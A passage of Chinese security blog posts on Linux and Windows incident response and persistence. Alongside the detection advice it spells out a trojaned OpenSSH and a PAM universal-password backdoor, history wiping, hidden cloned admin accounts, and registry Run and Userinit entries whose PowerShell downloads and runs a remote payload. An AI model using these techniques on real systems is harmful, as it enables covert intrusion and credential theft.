//记录本机登录远程的用户名和密码\n\t#define SECRETPW \"123456789\"          //后门的密码\n\nd、修改版本信息\nvi version.h\n\t#define SSH_VERSION \"填入之前记下来的版本号,伪装原版本\"\n\t#define SSH_PORTABLE \"小版本号\"\n\t\ne、安装并编译\n./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5\nmake clean\nmake && make install\nservice sshd restart\n\nf、对比原来的配置文件，使配置文件一致，然后修改文件日期。\n\ntouch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config\ntouch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config\n\ng、清除操作记录\nexport HISTFILE=/dev/null\nexport HISTSIZE=0\necho >/root/.bash_history //清空操作日志\n~~~\n\n排查技巧：利用strace找出ssh后门.\n\n```\n# 1、获取可疑进程PI\nps aux | grep sshd\n# 2、跟踪sshd PID\nstrace -o aa -ff -p  PID\n# 3、查看记录密码打开文件\ngrep open sshd* | grep -v -e No -e  null -e denied| grep  WR\n\n```\n\n\n\n#### **9、PAM后门**\n\nPAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。\n\n利用方法:\n\n~~~\n1、获取目标系统所使用的PAM版本，下载对应版本的pam版本\n2、解压缩，修改pam_unix_auth.c文件，添加万能密码\n3、编译安装PAM\n4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。\n~~~\n\n排查技巧：\n\n~~~\n# 1、通过Strace跟踪ssh\nps axu | grep sshd\nstrace -o aa -ff -p PID\ngrep open aa* | grep -v -e No -e null -e denied| grep WR\n# 2、检查pam_unix.so的修改时间\nstat /lib/security/pam_unix.so      #32位\nstat /lib64/security/pam_unix.so    #64位\n~~~\n\n\n\n#### **10、rookit后门**\n\nMafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。\n\n利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。\n\n连接后的截图：\n\n![](应急响应-Linux篇/privilege-5-7.png)\n\n排查技巧：查看端口是否异常，RPM check查看命令是否被替换。\n","tags":["应急响应"],"categories":["web安全"]},{"title":"应急响应 windows篇","url":"/2025/08/03/应急响应-windows篇/","content":"\n### 0x00 前言\n\n当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  \n\n<!--more-->\n\n常见的应急响应事件分类：\n\nWeb 入侵：网页挂马、主页篡改、Webshell\n\n系统入侵：病毒木马、勒索软件、远控后门\n\n网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗\n\n针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。\n\n### windows 入侵排查\n\n#### 0x01 入侵排查思路\n\n##### 1.1 检查系统账号安全\n\n1、查看服务器是否有弱口令，远程管理端口是否对公网开放。\n\n* 检查方法：据实际情况咨询相关服务器管理员。\n\n2、查看服务器是否存在可疑账号、新增账号。\n\n* 检查方法：打开 cmd 窗口，输入 `lusrmgr.msc` 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 \n* ![image-20250803131926441](应急响应-windows篇/image-20250803131926441.png)\n\n3、查看服务器是否存在隐藏账号、克隆账号。\n\n* 检查方法：\n\n  a、打开注册表 ，查看管理员对应键值。\n\n  在注册表编辑器中，找到 “HKEY_LOCAL_MACHINE\\SAM\\SAM”。默认情况下，该选项内容无法查看，需右键点击 “SAM”，选择 “权限”，打开权限管理窗口。选择当前用户（通常为 administrator），将权限勾选为 “完全控制”，点击 “确定” 后关闭注册表编辑器。\n\n  再次打开注册表编辑器，定位到 “HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names”。在此项下，可以看到系统中的所有用户名，包括可能存在的隐藏账号。\n\n  ![image-20250803132311363](应急响应-windows篇/image-20250803132311363.png)\n\n  若出现本地账户中没有的账户，尤其是用户名后面带有 “$” 符号的，很可能就是隐藏账户。在确认为非系统用户的前提下，可进一步确认其是否为恶意账号。\n\n  正常情况下，每个账号都有唯一对应的键值（F 值）。攻击者通常会将克隆账号的 F 值修改为与管理员账号（administrator）相同，以获取管理员权限。因此，对于发现的可疑隐藏账号，查看其对应的 F 值是否和 “administrator” 对应的 F 值相同，如果相同，则可判断该账号为克隆账号。\n\n  b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。\n\n4、结合日志，查看管理员登录时间、用户名是否存在异常。\n\n* 检查方法：\n\n  a、Win+R 打开运行，输入\"eventvwr.msc\"，回车运行，打开“事件查看器”。\n\n  ![image-20250803132645754](应急响应-windows篇/image-20250803132645754.png)\n\n  ![image-20250803132743814](应急响应-windows篇/image-20250803132743814.png)\n\n  ![image-20250803132859378](应急响应-windows篇/image-20250803132859378.png)\n\n  \n\n  b、导出 Windows 日志 -- 安全，利用微软官方工具 [Log Parser](https://www.microsoft.com/en-us/download/details.aspx?id=24659) 进行分析。\n\n    需要先去事件管理器进行导出日志，然后在进行查询\n\n  `LogParser.exe -i:EVT \"SELECT TimeGenerated AS LoginTime, EXTRACT_TOKEN(Strings, 5, '|') AS Username FROM 1.evtx WHERE EventID = 4624\"`\n\n  ![image-20250803134835606](应急响应-windows篇/image-20250803134835606.png)\n\n\n\n##### 1.2 检查异常端口、进程\n\n1、检查端口连接情况，是否有远程连接、可疑连接。\n\n* 检查方法：\n\n  a、使用`netstat -ano` 命令查看目前的网络连接，定位可疑的 ESTABLISHED \n\n  b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 `tasklist  | findstr \"PID\"`\n\n  ![image-20250803135155326](应急响应-windows篇/image-20250803135155326.png)\n\n\n\n2、进程\n\n* 检查方法：\n\n  a、开始 -- 运行 -- 输入 `msinfo32` 命令，依次点击 \"软件环境 -- 正在运行任务\" 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。\n\n  b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。\n\n  c、通过微软官方提供的 Process Explorer 等工具进行排查 。 这里我们也可以利用火绒剑，PCHunter钩子，来查看对应的进程是否有异常的网络活动等等。\n\n  d、查看可疑的进程及其子进程。可以通过观察以下内容：\n\n  ```\n  没有签名验证信息的进程\n  没有描述信息的进程\n  进程的属主\n  进程的路径是否合法\n  CPU 或内存资源占用长时间过高的进程\n  ```\n\n3、小技巧：\n\n​\ta、查看端口对应的 PID：`netstat -ano | findstr \"port\"`\n\n​\tb、查看进程对应的 PID：任务管理器 -- 查看 -- 选择列 -- PID 或者 `tasklist  | findstr \"PID\"`\n\n​\tc、查看进程对应的程序位置：\n\n​\t\t任务管理器 -- 选择对应进程 -- 右键打开文件位置\n\n​\t\t运行输入 `wmic`，cmd 界面输入 `process`    这里win10可以正常使用，win11已经弃用\n\n![image-20250803135649681](应急响应-windows篇/image-20250803135649681.png)\n\n​\t\twin11用户可以按照以下步骤，在 Windows 11 系统中修复该错误：\n\n​\t\t1. 打开设置应用，跳转到系统可选功能。\n\n​\t\t2. 点击“添加可选功能”选项旁边的“查看功能”。\n\n​\t\t3. 在搜索框中键入 WMIC，并在结果列表中打勾。\n\n​\t\t4. 单击“下一步”在 Windows 11 中安装 WMIC。\n\n​\td、`tasklist /svc`   进程 -- PID -- 服务    这里需要关注进程名，对应的服务等。\n\n​\te、查看Windows服务所对应的端口：\n\n​\t\t%systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\\Windows 路径）\n\n![image-20250803140535879](应急响应-windows篇/image-20250803140535879.png)\n\n##### 1.3 检查启动项、计划任务、服务\n\n1、检查服务器是否有异常的启动项。\n\n* 检查方法：\n\n  a、登录服务器，单击【开始】>【所有程序】>【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。 启动目录，里面的文件会随着系统启动而运行。\n  b、单击开始菜单 >【运行】，输入 `msconfig`，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。\n  c、单击【开始】>【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：\n\n  ```\n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run\n  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce\n  ```\n\n  检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。\n\n  d、利用安全软件查看启动项、开机时间管理等。\n\n  e、组策略，运行 `gpedit.msc`\n\n  ![image-20250803141517105](应急响应-windows篇/image-20250803141517105.png)\n\n  \n\n2、检查计划任务\n\n* 检查方法：\n\n  a、单击【开始】>【设置】>【控制面板】>【任务计划】，查看计划任务属性，便可以发现木马文件的路径。\n\n  ![](应急响应-windows篇/image-20250803141859166.png)\n\n  b、单击【开始】>【运行】；输入 `cmd`，然后输入 `at`，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。\n\n  ![image-20250803142307415](应急响应-windows篇/image-20250803142307415.png)\n\n3、服务自启动\n\n* 检查方法：单击【开始】>【运行】，输入 `services.msc`，注意服务状态和启动类型，检查是否有异常服务。\n\n![image-20250803142526549](应急响应-windows篇/image-20250803142526549.png)\n\n注意服务的启动参数，还有启动类型等等\n\n##### 1.4 检查系统相关信息\n\n1、查看系统版本以及补丁信息\n\n* 检查方法：单击【开始】>【运行】，输入 `systeminfo`，查看系统信息。(特别关注新爆出来的0day,nday漏洞，及时打补丁)\n\n2、查找可疑目录及文件\n\n* 检查方法：\n\n  a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。\n\n  ```\n  Window 2003版本 C:\\Documents and Settings\n  Window 2008R2及以后版本 C:\\Users\\\n  ```\n\n  ![image-20250803142847304](应急响应-windows篇/image-20250803142847304.png)\n\n  b、单击【开始】>【运行】，输入 `%UserProfile%\\Recent`，分析最近打开分析可疑文件。\n\n  c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。\n\n  d、回收站、浏览器下载目录、浏览器历史记录\n\n  e、修改时间在创建时间之前的为可疑文件\n\n3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？\n\n​    a、利用 [Registry Workshop](http://www.torchsoft.com/en/rw_information.html) 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。\n​    b、利用计算机自带文件搜索功能，指定修改时间进行搜索。\n\n##### 1.5 自动化查杀\n\n* 病毒查杀\n\n  * 检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。\n\n* webshell查杀\n\n  * 检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。\n\n##### 1.6 日志分析\n\n系统日志\n\n* 分析方法：\n\n  a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。\n\n  b、Win+R 打开运行，输入 \"eventvwr.msc\"，回车运行，打开\"事件查看器\"。\n\n  C、导出应用程序日志、安全日志、系统日志，利用 [Log Parser](https://www.microsoft.com/en-us/download/details.aspx?id=24659) 进行分析。\n\nWeb 访问日志\n\n* 分析方法：\n\n  a、找到中间件的web日志，打包到本地方便进行分析。\n\n  b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。\n\n#### 0x02 工具篇\n\n##### 2.1 病毒分析 \n\nPCHunter：http://www.xuetr.com\n\n火绒剑：https://www.huorong.cn\n\nProcess Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer\n\nprocesshacker：https://processhacker.sourceforge.io/downloads.php\n\nautoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n\nOTL：https://www.bleepingcomputer.com/download/otl/\n\nSysInspector：http://download.eset.com.cn/download/detail/?product=sysinspector\n\n\n\n##### 2.2 病毒查杀\n\n卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe   （推荐理由：绿色版、最新病毒库）\n\n大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）\n\n火绒安全软件：https://www.huorong.cn\n\n360杀毒：http://sd.360.cn/download_center.html\n\n\n\n##### 2.3 病毒动态\n\nCVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn\n\n微步在线威胁情报社区：https://x.threatbook.cn\n\n火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html\n\n爱毒霸社区：http://bbs.duba.net\n\n腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html\n\n\n\n##### 2.4 在线病毒扫描网站\n\nVirustotal：https://www.virustotal.com\n\nVirscan：http://www.virscan.org\n\n腾讯哈勃分析系统：https://habo.qq.com\n\nJotti 恶意软件扫描系统：https://virusscan.jotti.org\n\n\n\n##### 2.5 webshell查杀\n\nD盾_Web查杀：http://www.d99net.net/index.asp\n\n河马 WebShell 查杀：http://www.shellpub.com\n\n\n\n### Windows日志分析\n\n####  0x01 Windows事件日志简介\n\nWindows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。\n\nWindows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。\n\n**系统日志**\n\n```\n记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。\n\n默认位置： %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx\n```\n\n**应用程序日志**\n\n```\n包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 \n\n默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx\n```\n\n**安全日志**\n\n```\n记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。\n\n默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx\n```\n\n​\t系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 \n\n#### 0X02 审核策略与事件查看器\n\nWindows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。\n\nPS：默认状态下，也会记录一些简单的日志，日志默认大小20M\n\n**设置1**：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：\n\n![image-20250803152322124](应急响应-windows篇/image-20250803152322124.png)\n\n**设置2**：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： \n\n![image-20250803152425833](应急响应-windows篇/image-20250803152425833.png)\n\n\n\n**查看系统日志方法：**\n\n1. 在**“开始”**菜单上，依次指向**“所有程序”**、**“管理工具”**，然后单击**“事件查看器”**\n2. 按 \"**Window+R**\"，输入 ”**eventvwr.msc**“ 也可以直接进入“**事件查看器**” \n\n#### 0x03 事件日志分析\n\n对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：\n\n| 事件ID | 说明                             |\n| :----- | -------------------------------- |\n| 4624   | 登录成功                         |\n| 4625   | 登录失败                         |\n| 4634   | 注销成功                         |\n| 4647   | 用户启动的注销                   |\n| 4672   | 使用超级用户（如管理员）进行登录 |\n| 4720   | 创建用户                         |\n\n\n每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：\n\n| 登录类型 | 描述                            | 说明                                             |\n| :------- | ------------------------------- | ------------------------------------------------ |\n| 2        | 交互式登录（Interactive）       | 用户在本地进行登录。                             |\n| 3        | 网络（Network）                 | 最常见的情况就是连接到共享文件夹或共享打印机时。 |\n| 4        | 批处理（Batch）                 | 通常表明某计划任务启动。                         |\n| 5        | 服务（Service）                 | 每种服务都被配置在某个特定的用户账号下运行。     |\n| 7        | 解锁（Unlock）                  | 屏保解锁。                                       |\n| 8        | 网络明文（NetworkCleartext）    | 登录的密码在网络上是通过明文传输的，如FTP。      |\n| 9        | 新凭证（NewCredentials）        | 使用带/Netonly参数的RUNAS命令运行一个程序。      |\n| 10       | 远程交互，（RemoteInteractive） | 通过终端服务、远程桌面或远程协助访问计算机。     |\n| 11       | 缓存交互（CachedInteractive）   | 以一个域用户登录而又没有域控制器可用             |\n\n关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。\n\n> 原文链接 ：https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008\n\n案例1：可以利用eventlog事件来查看系统账号登录情况：\n\n1. 在**“开始”**菜单上，依次指向**“所有程序”**、**“管理工具”**，然后单击**“事件查看器”**；\n\n2. 在事件查看器中，单击**“安全”**，查看安全日志；\n\n3. 在安全日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。\n\n   4624  --登录成功   \n   4625  --登录失败  \n   4634 -- 注销成功\n   4647 -- 用户启动的注销   \n   4672 -- 使用超级用户（如管理员）进行登录\n\n\n\n如果出现大量打4625登录错误，那么大概率被暴力破解\n\n案例2：可以利用eventlog事件来查看计算机开关机的记录： \n\n1、在**“开始”**菜单上，依次指向**“所有程序”**、**“管理工具”**，然后单击**“事件查看器”**；\n\n2、在事件查看器中，单击**“系统”**，查看系统日志；\n\n3、在系统日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。\n\n其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。\n\t6005 信息 EventLog 事件日志服务已启动。(开机)\n\t6006 信息 EventLog 事件日志服务已停止。(关机)\n\t6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机\n\n#### 0x04 日志分析工具\n\n#### Log Parser\n\nLog Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。\n\nLog Parser 2.2下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=24659\n\nLog Parser 使用示例：https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/\n\n![](应急响应-windows篇/log-1-6.png)\n\n**基本查询结构** \n\n~~~\nLogparser.exe –i:EVT –o:DATAGRID \"SELECT * FROM c:\\xx.evtx\"\n~~~\n\n**使用Log Parser分析日志**\n\n1、查询登录成功的事件\n\n~~~\n登录成功的所有事件\nLogParser.exe -i:EVT –o:DATAGRID  \"SELECT *  FROM c:\\Security.evtx where EventID=4624\"\n\n指定登录时间范围的事件：\nLogParser.exe -i:EVT –o:DATAGRID  \"SELECT *  FROM c:\\Security.evtx where TimeGenerated>'2018-06-19 23:32:11' and TimeGenerated<'2018-06-20 23:34:00' and EventID=4624\"\n\n提取登录成功的用户名和IP：\nLogParser.exe -i:EVT  –o:DATAGRID  \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\\Security.evtx where EventID=4624\"\n\n~~~\n\n 2、查询登录失败的事件\n\n~~~\n登录失败的所有事件：\nLogParser.exe -i:EVT –o:DATAGRID  \"SELECT *  FROM c:\\Security.evtx where EventID=4625\"\n\n提取登录失败用户名进行聚合统计：\nLogParser.exe  -i:EVT \"SELECT  EXTRACT_TOKEN(Message,13,' ')  as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message\" \n\n~~~\n\n3、系统历史开关机记录：\n\n~~~\nLogParser.exe -i:EVT –o:DATAGRID  \"SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006\"\n\n~~~\n\n#### LogParser Lizard\n\n对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。\n\n下载地址：http://www.lizard-labs.com/log_parser_lizard.aspx\n\n依赖包：Microsoft .NET Framework 4 .5，下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=42642\n\n查询最近用户登录情况：\n\n![](应急响应-windows篇/log-1-7.png)\n\n#### Event Log Explorer\n\nEvent Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。\n\n下载地址：https://event-log-explorer.en.softonic.com/\n\n![](应急响应-windows篇/log-1-8.png)\n\n参考链接：\n\nWindows日志分析   https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ\n\n### Windows权限维持--隐藏\n\n#### 0x00 前言\n\n攻击者在获取服务器权限后，通常会用一些后门来维持权限，如果你想让你的后门保持的更久些，那么请隐藏好它，使之不易被管理员发现。\n\n#### 0x01 隐藏文件\n\n1、利用文件属性\n\n最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件里看不到刚刚的文件了。(自欺欺人)\n\n\n\n如何真正隐藏文件？\n\n使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。\n\n`attrib +s +a +h +r  D:\\test\\project\\test`.txt\n\n这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。\n\n破解隐藏文件：\n\n打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。\n\n![image-20250803154215111](应急响应-windows篇/image-20250803154215111.png)\n\n\n\n对于一般的电脑小白有用\n\n**2、驱动级文件隐藏**\n\n驱动隐藏我们可以用过一些软件来实现，软件名字叫：Easy File Locker      \n\n下载链接： http://www.xoslab.com/efl.html\n\n如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件：\n\n```\nc:\\WINDOWS\\xlkfs.dat\nc:\\WINDOWS\\xlkfs.dll\nc:\\WINDOWS\\xlkfs.ini\nc:\\WINDOWS\\system32\\drivers\\xlkfs.sys\n```\n\n那么你，应该是遭遇了驱动级文件隐藏。\n\n如何清除？\n\n~~~\n1、查询服务状态： sc qc xlkfs\n2、停止服务： net stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现\n3、删除服务： sc delete xlkfs\n4、删除系统目录下面的文件，重启系统，确认服务已经被清理了。\n~~~\n\n隐藏文件的方式还有很多，比如伪装成一个系统文件夹图标，利用畸形文件名、保留文件名无法删除，甚至取一个与系统文件很像的文件名并放在正常目录里面，很难辨别出来。\n\n这些隐藏文件的方式早已不再是秘密，而更多的恶意程序开始实现“无文件”攻击，这种方式极难被发现。\n\n#### 0x02 隐藏账号\n\nwindow 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。只对于电脑小白有用。\n\n![image-20250803160043877](应急响应-windows篇/image-20250803160043877.png)\n\n去查一下注册表或者lusrmgr.msc一下就看出来了\n\n![image-20250803160326581](应急响应-windows篇/image-20250803160326581.png)\n\n克隆账号制作过程：\n\n1、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\\SAM\\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。\n\n2、来到注册表编辑器的“HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ea，找到箭头所指目录。\n\n![image-20250803160725986](应急响应-windows篇/image-20250803160725986.png)\n\n3、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EA”的F值中，保存。\n\n4、分别test$和“000003EA导出到桌面，删除test$用户   net user test$ /del\n\n![image-20250803161115191](应急响应-windows篇/image-20250803161115191.png)\n\n5、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$这个账户的，只有在注册表中才能看得到。\n\n![image-20250803161341862](应急响应-windows篇/image-20250803161341862.png)\n\n检测和清理方法：\n\n使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。\n\n#### 0x03 端口复用\n\n通过端口复用来达到隐藏端口的目的，在Window下，如何实现端口复用呢？\n\n前阵子，@Twi1ight公布了一种基于内置系统服务的端口复用后门方法，利用WinRM服务，一条命令实现端口复用后门：\n\n`winrm set winrm/config/service @{EnableCompatibilityHttpListener=\"true\"}`\n\n一般开启WinRM服务作为远程管理，但还是第一次听到可以作为端口复用，一种简单容易实现的端口复用方式。假设，攻击者已获取到administrator账号密码，连接远程WinRM服务执行命令：\n\n#### 0x04 进程注入\n\n进程注入，一直是病毒木马的惯用手段，同时，它也是一种隐藏技术。在常见的渗透测试框架中，进程注入是怎么做的以及我们如何通过工具排查出来？\n\n**1、meterpreter会话注入**\n\n当前权限无法获取hash值，查看目前系统进程\n\n![](应急响应-windows篇/privilege-1-10.png)\n\n通过migrate将进程注入到system进程后，成功获得hash值。\n\n![](应急响应-windows篇/privilege-1-11.png)\n\nWindow后门排查：\n\n通过TCPview显示已建立的TCP连接，我们可以看到异常的连接，同时，恶意软件将以绿色显示不到一秒钟，然后变成红色消失，如此循环。 \n\n![](应急响应-windows篇/privilege-1-12.png)\n\n**2、Empire会话进程注入**\n\n通过psinject模块进行会话注入，直接输入ps选择一个SYSTEM权限的进程PID，使用进程注入模块，来获取权限。如下图：\n\n![](应急响应-windows篇/privilege-1-13.png)\n\nWindow后门排查：利用process monitor或者火绒剑监控进程都可以定位到注入进程。\n\n![](应急响应-windows篇/privilege-1-14.png)\n\n![](应急响应-windows篇/privilege-1-15.png)\n\n**3、Cobalt Strike进程注入**\n\n选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon。\n\n![](应急响应-windows篇/privilege-1-16.png)\n\n![](应急响应-windows篇/privilege-1-17.png)\n\nWindow后门排查：利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔。\n\n![](应急响应-windows篇/privilege-1-18.png)\n\n\n\n### Windows权限维持--后门\n\n关键词：Windows系统后门、权限维持\n\n在获取服务器权限后，通常会用一些后门技术来维持服务器权限，服务器一旦被植入后门，攻击者便如入无人之境。本文将对常见的window服务端自启动后门技术进行解析，知己知彼方能杜绝后门。\n\n\n\n**0x01 注册表自启动**\n\n通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。\n\n常用的注册表启动键：\n\n```\n# Run键 \nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# Winlogon\\Userinit键\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\n\n类似的还有很多,关键词：注册表启动键值。\n```\n\n使用以下命令可以一键实现无文件注册表后门：\n\n`reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" /f`\n\n**Logon Scripts 后门**\n\n注册表路径：HKEY_CURRENT_USER\\Environment\\\n\n创建字符串键值：  UserInitMprLogonScript，键值设置为bat的绝对路径：`c:\\test.bat`\n\n**userinit后门**\n\n在用户进行登陆时，winlogon运行指定的程序。根据官方文档,可以更改它的值来添加与删除程序。\n\n利用USERINIT注册表键实现无文件后门：\n\n~~~\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]\n \n\"Userinit\"=\"C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\"\n~~~\n\n**0x02 